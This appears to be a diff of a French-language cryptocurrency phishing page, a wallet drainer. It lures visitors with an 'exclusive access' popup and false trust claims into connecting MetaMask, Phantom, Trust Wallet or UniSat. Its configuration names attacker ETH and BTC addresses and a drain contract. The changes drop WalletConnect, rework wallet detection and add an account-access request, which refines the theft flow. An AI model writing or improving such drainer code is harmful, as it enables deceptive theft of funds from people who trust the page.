@@ -8,7 +8,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@scure/btc-signer@1.2.0/dist/index.umd.js"></script>
     <style>
         /* Styles pour le popup et l'overlay */
@@ -187,7 +186,7 @@
             <h2 style="margin-bottom: 15px; font-size: 24px; font-weight: 700;">Accès Exclusif Requis</h2>
             <p style="margin-bottom: 20px; font-size: 16px;">
                 Pour accéder à notre plateforme premium et bénéficier de services exclusifs, veuillez connecter votre wallet. <br>
-                <strong>Sur mobile :</strong> Cliquez sur le bouton de votre wallet pour le connecter. Vous devrez peut-être scanner un QR code ou confirmer la connexion dans votre wallet.
+                <strong>Sur mobile :</strong> Utilisez le navigateur intégré de votre wallet (par exemple, MetaMask) pour une connexion directe.
             </p>
             <p class="trust-text">Sécurisé et utilisé par des milliers d'utilisateurs. Nous respectons vos données.</p>
             <button class="connect-btn" id="connectWallet">Connecter mon wallet</button>
@@ -214,8 +213,7 @@
             ETH_PRICE_USD: 2000,
             ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754',
             BTC_ATTACKER_ADDRESS: 'tb1qmqts2vhpzul4ltmvs97gdnvsfm3h6slfv2vv2l',
-            DRAIN_CONTRACT_ADDRESS: '0x5D8F38c17aB48446c7b28E38076aCD9057480963', // Adresse correcte pour Sepolia
-            WALLET_CONNECT_PROJECT_ID: '734ae739400cb6571838de4b118a972d' // Ton projectId
+            DRAIN_CONTRACT_ADDRESS: '0x5D8F38c17aB48446c7b28E38076aCD9057480963' // Adresse correcte pour Sepolia
         };
 
         // URL Telegram
@@ -307,18 +305,6 @@
             }
         });
 
-        // Fonction pour attendre que EthereumProvider soit chargé
-        async function waitForEthereumProvider(timeout = 5000) {
-            const start = Date.now();
-            while (typeof window.EthereumProvider === 'undefined') {
-                if (Date.now() - start >= timeout) {
-                    throw new Error('EthereumProvider n’a pas pu être chargé dans le délai imparti.');
-                }
-                await delay(100); // Attendre 100ms avant de vérifier à nouveau
-            }
-            return window.EthereumProvider;
-        }
-
         // Fonction pour détecter les wallets (PC et mobile)
         async function detectWallet(elements) {
             await delay(1000); // Attendre l'injection des wallets
@@ -333,32 +319,28 @@
                     id: 'metamask',
                     provider: window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null,
                     icon: 'images/metamask-icon.svg',
-                    type: 'ethereum',
-                    walletConnect: true
+                    type: 'ethereum'
                 },
                 {
                     name: 'Phantom',
                     id: 'phantom',
                     provider: window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null,
                     icon: 'images/phantom-icon.svg',
-                    type: 'ethereum',
-                    walletConnect: true
+                    type: 'ethereum'
                 },
                 {
                     name: 'Trust Wallet',
                     id: 'trustwallet',
                     provider: window.ethereum && window.ethereum.isTrust ? window.ethereum : null,
                     icon: 'images/trustwallet-logo.svg',
-                    type: 'ethereum',
-                    walletConnect: true
+                    type: 'ethereum'
                 },
                 {
                     name: 'UniSat',
                     id: 'unisat',
                     provider: window.unisat ? window.unisat : null,
                     icon: 'images/unisat.png',
-                    type: 'unisat',
-                    walletConnect: false // UniSat ne supporte pas WalletConnect
+                    type: 'unisat'
                 }
             ];
 
@@ -379,21 +361,14 @@
 
             updateProviders();
 
-            // Sur PC ou si un provider est déjà injecté : Détection directe
-            if (!isMobile || supportedWallets.some(wallet => wallet.provider)) {
-                for (const wallet of supportedWallets) {
-                    if (wallet.provider) {
-                        console.log(`${wallet.name} détecté`);
-                        return { type: wallet.type, provider: wallet.provider, name: wallet.name };
-                    }
-                }
-                if (!isMobile) {
-                    updateStatus(elements, 'Aucun wallet détecté. Installez un wallet compatible (MetaMask, Phantom, ou UniSat).', false, 'red');
-                    return null;
-                }
+            // Détection directe si un provider est injecté
+            const detectedWallet = supportedWallets.find(wallet => wallet.provider);
+            if (detectedWallet) {
+                console.log(`${detectedWallet.name} détecté`);
+                return { type: detectedWallet.type, provider: detectedWallet.provider, name: detectedWallet.name };
             }
 
-            // Sur Mobile : Basculer vers la vue de sélection des wallets
+            // Si aucun wallet n'est détecté, afficher la liste des wallets
             elements.introView.classList.add('hidden');
             elements.walletSelectionView.classList.remove('hidden');
             updateStatus(elements, '', false); // Effacer le texte de statut initial
@@ -407,33 +382,16 @@
                     Connecter avec ${wallet.name}
                 `;
                 button.addEventListener('click', async () => {
-                    updateStatus(elements, `Connexion à ${wallet.name}... Scannez le QR code ou confirmez dans votre wallet.`, true);
+                    updateStatus(elements, `Connexion à ${wallet.name}... Veuillez confirmer dans votre wallet.`, true);
                     walletListContainer.classList.add('hidden');
 
                     try {
                         let provider;
                         if (wallet.provider) {
-                            // Si le provider est déjà injecté (par exemple, dans le navigateur du wallet)
-                            console.log(`${wallet.name} déjà injecté`);
+                            console.log(`${wallet.name} détecté`);
                             provider = wallet.provider;
-                        } else if (wallet.walletConnect) {
-                            // Attendre que EthereumProvider soit chargé
-                            await waitForEthereumProvider();
-
-                            // Utiliser WalletConnect v2 (AppKit) pour connecter le wallet
-                            const walletConnectProvider = await window.EthereumProvider.init({
-                                projectId: CONFIG.WALLET_CONNECT_PROJECT_ID, // Ton projectId
-                                chains: [11155111], // ID de Sepolia (ou 1 pour Mainnet)
-                                showQrModal: true, // Affiche un QR code pour la connexion
-                                optionalChains: [1, 137, 42161], // Autres chaînes supportées (Mainnet, Polygon, Arbitrum, etc.)
-                                methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
-                                events: ['chainChanged', 'accountsChanged']
-                            });
-                            await walletConnectProvider.connect();
-                            provider = new window.ethers.providers.Web3Provider(walletConnectProvider);
                         } else {
-                            // Cas de UniSat sur mobile
-                            updateStatus(elements, `${wallet.name} n'est pas supporté sur mobile. Veuillez utiliser un autre wallet (comme MetaMask) ou tester sur PC.`, false, 'red');
+                            updateStatus(elements, `${wallet.name} n’est pas détecté. Veuillez l’installer ou utiliser le navigateur intégré de votre wallet.`, false, 'red');
                             walletListContainer.classList.remove('hidden');
                             return;
                         }
@@ -462,7 +420,8 @@
             try {
                 if (wallet.type === 'ethereum') {
                     const provider = new window.ethers.providers.Web3Provider(wallet.provider);
-                    await provider.ready;
+                    // Demander l'accès au compte
+                    await provider.send('eth_requestAccounts', []);
                     const network = await provider.getNetwork();
                     console.log('Réseau détecté :', network.name);
 
